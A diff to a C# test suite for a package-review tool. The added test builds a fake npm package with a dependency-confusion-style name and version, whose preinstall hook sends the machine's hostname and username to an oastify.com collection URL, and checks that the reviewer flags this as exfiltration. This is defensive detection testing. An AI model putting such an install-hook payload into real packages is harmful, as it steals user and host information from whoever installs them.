@@ -51,6 +51,18 @@ public sealed class PackageReviewTests : IDisposable
     }
 
     [Fact]
+    public void Each_package_finding_names_a_rule_of_the_table_and_reads_as_the_shared_record()
+    {
+        var r = Review(Tgz("internal-auth-1.0.0.tgz",
+            ("package/package.json", """{"name":"internal-auth-utils","version":"99.0.0","scripts":{"preinstall":"node index.js"}}"""),
+            ("package/index.js", "const os=require('os'),https=require('https');\nhttps.get('https://x1.oastify.com/?h='+os.hostname()+'&u='+os.userInfo().username);")));
+        Assert.All(r.Findings, f => Assert.NotNull(FindingRules.Find(f.Rule)));
+        var collector = r.Findings.First(f => f.Rule == "package/collection-url").ToFinding();
+        Assert.Equal(new Finding("noteworthy", "package/collection-url", "exfiltration", collector.Evidence, "package/index.js", "package"), collector);
+        Assert.Throws<InvalidOperationException>(() => new PackageFinding("package/network", "noteworthy", "network", "opens network connections"));
+    }
+
+    [Fact]
     public void An_install_script_that_downloads_and_runs_a_program_is_noteworthy()
     {
         var r = Review(Tgz("parser-0.7.29.tgz",
